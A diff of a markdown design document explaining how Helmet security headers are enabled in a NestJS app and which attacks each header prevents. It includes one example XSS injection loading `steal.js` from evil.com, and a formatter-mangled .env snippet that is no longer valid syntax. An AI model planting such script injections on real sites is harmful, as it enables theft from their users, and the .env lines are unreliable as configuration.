@@ -14,6 +14,7 @@ Web applications are vulnerable to common attacks like **XSS, Clickjacking, MIME
 ### Problem
 
 **Without Security Headers:**
+
 ```http
 HTTP/1.1 200 OK
 Content-Type: text/html
@@ -22,6 +23,7 @@ Content-Type: text/html
 ```
 
 **Risks:**
+
 - ❌ **XSS Attacks:** Malicious scripts can execute
 - ❌ **Clickjacking:** Site can be embedded in iframe
 - ❌ **MIME Sniffing:** Browser executes unexpected content types
@@ -47,10 +49,11 @@ async function bootstrap() {
   if (configService.get<boolean>('app.security.helmet.enabled', true)) {
     app.use(
       helmet({
-        crossOriginEmbedderPolicy: false,  // Allow embedding assets
-        contentSecurityPolicy: environment === 'production' 
-          ? undefined   // Enable CSP in production
-          : false,      // Disable CSP in dev (Swagger needs it)
+        crossOriginEmbedderPolicy: false, // Allow embedding assets
+        contentSecurityPolicy:
+          environment === 'production'
+            ? undefined // Enable CSP in production
+            : false, // Disable CSP in dev (Swagger needs it)
       }),
     );
   }
@@ -60,6 +63,7 @@ async function bootstrap() {
 ```
 
 **Configuration:**
+
 ```typescript
 // src/config/app.config.ts
 export const appConfig = registerAs('app', () => ({
@@ -76,57 +80,71 @@ export const appConfig = registerAs('app', () => ({
 ## Security Headers Applied
 
 ### 1. X-Content-Type-Options: nosniff
+
 ```http
 X-Content-Type-Options: nosniff
 ```
+
 **Prevents:** MIME type sniffing (browser respects Content-Type header)  
 **Example Attack:** Server sends `image.jpg` (actually contains JS), browser executes it  
 **Helmet Fix:** Browser won't execute, throws error instead
 
 ### 2. X-Frame-Options: SAMEORIGIN
+
 ```http
 X-Frame-Options: SAMEORIGIN
 ```
+
 **Prevents:** Clickjacking attacks (site embedded in malicious iframe)  
 **Example Attack:** Attacker embeds bank site in iframe, overlays fake UI  
 **Helmet Fix:** Only allows embedding from same origin
 
 ### 3. Strict-Transport-Security (HSTS)
+
 ```http
 Strict-Transport-Security: max-age=15552000; includeSubDomains
 ```
+
 **Prevents:** Protocol downgrade attacks (HTTPS → HTTP)  
 **Example Attack:** Man-in-the-middle downgrades connection to HTTP  
 **Helmet Fix:** Browser enforces HTTPS for 180 days
 
 ### 4. X-Download-Options: noopen
+
 ```http
 X-Download-Options: noopen
 ```
+
 **Prevents:** IE8+ auto-opening downloads in browser context  
 **Example Attack:** Download HTML file, IE executes scripts in site context  
 **Helmet Fix:** Forces "Save As" instead of "Open"
 
 ### 5. X-Permitted-Cross-Domain-Policies: none
+
 ```http
 X-Permitted-Cross-Domain-Policies: none
 ```
+
 **Prevents:** Flash/PDF cross-domain data loading  
 **Helmet Fix:** Disallows cross-domain policies
 
 ### 6. Referrer-Policy: no-referrer
+
 ```http
 Referrer-Policy: no-referrer
 ```
+
 **Prevents:** Sensitive data leakage via Referer header  
 **Example:** User visits `https://site.com/orders/12345?token=secret`  
 Then clicks external link → Referer exposes token!  
 **Helmet Fix:** No Referer sent to external sites
 
 ### 7. Content-Security-Policy (CSP) - Production Only
+
 ```http
 Content-Security-Policy: default-src 'self'
 ```
+
 **Prevents:** XSS attacks (restricts resource loading)  
 **Example:** Attacker injects `<script src="evil.com/steal.js"></script>`  
 **Helmet Fix:** Browser blocks script from untrusted domain
@@ -138,19 +156,25 @@ Content-Security-Policy: default-src 'self'
 ## Implementation
 
 **Configuration:**
+
 ```typescript
 // .env
-HELMET_ENABLED=true  // Production: true, Dev: false (optional)
+HELMET_ENABLED = true; // Production: true, Dev: false (optional)
 
 // docker-compose.yml (dev)
-HELMET_ENABLED=false  // Disable for local dev (Swagger compatibility)
+HELMET_ENABLED = false; // Disable for local dev (Swagger compatibility)
 ```
 
 **Conditional Enabling:**
+
 ```typescript
 // Helmet enabled by default, can be disabled via env var
 if (configService.get<boolean>('app.security.helmet.enabled', true)) {
-  app.use(helmet({ /* ... */ }));
+  app.use(
+    helmet({
+      /* ... */
+    }),
+  );
 }
 ```
 
@@ -162,19 +186,21 @@ if (configService.get<boolean>('app.security.helmet.enabled', true)) {
 ✅ **Multiple Headers:** Sets 11+ security headers automatically  
 ✅ **Browser Support:** Works on all modern browsers  
 ✅ **Performance:** Negligible overhead (<0.1ms per request)  
-✅ **Compliance:** Helps meet security standards (OWASP, PCI-DSS)  
+✅ **Compliance:** Helps meet security standards (OWASP, PCI-DSS)
 
 ---
 
 ## Trade-offs
 
 **1. CSP Breaks Swagger in Dev**
+
 ```
 Problem: Swagger UI uses inline scripts, CSP blocks them
 Solution: Disable CSP in development, enable in production
 ```
 
 **2. X-Frame-Options Breaks Embedding**
+
 ```
 Problem: Can't embed site in iframe (even legitimate use cases)
 Solution: Use frame-ancestors CSP directive for fine-grained control
@@ -198,11 +224,10 @@ Referrer-Policy: no-referrer
 ```
 
 **Automated Test:**
+
 ```typescript
 it('should include security headers', async () => {
-  const response = await request(app.getHttpServer())
-    .get('/api/v1/health')
-    .expect(200);
+  const response = await request(app.getHttpServer()).get('/api/v1/health').expect(200);
 
   expect(response.headers['x-content-type-options']).toBe('nosniff');
   expect(response.headers['x-frame-options']).toBe('SAMEORIGIN');
